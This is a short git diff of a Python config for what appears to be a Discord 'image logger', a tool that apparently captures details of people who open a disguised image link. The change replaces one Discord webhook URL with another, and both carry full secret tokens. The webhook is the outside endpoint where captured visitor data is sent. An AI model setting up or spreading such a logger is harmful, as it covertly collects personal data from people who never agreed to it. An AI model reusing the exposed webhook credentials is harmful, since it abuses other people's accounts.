@@ -12,7 +12,7 @@ __author__ = "kaddin"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1102117736823398470/lUko4fZf_Iv0bpOYgTYPEhjyHfV-oC7U-NtOzje5AY424OSZZproCuhUKlGBqKuHt8p_",
+    "webhook": "https://discord.com/api/webhooks/1238489220406837371/mdQVgGIxPSKGanRCQV0ijQatxtx4olttpFN4gknkF00wm1TqQGwVuw36Z-q2PIb0v22f",
     "image": "https://cdn.discordapp.com/attachments/1090417526023925841/1102120286695993374/kaddinbanner1.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
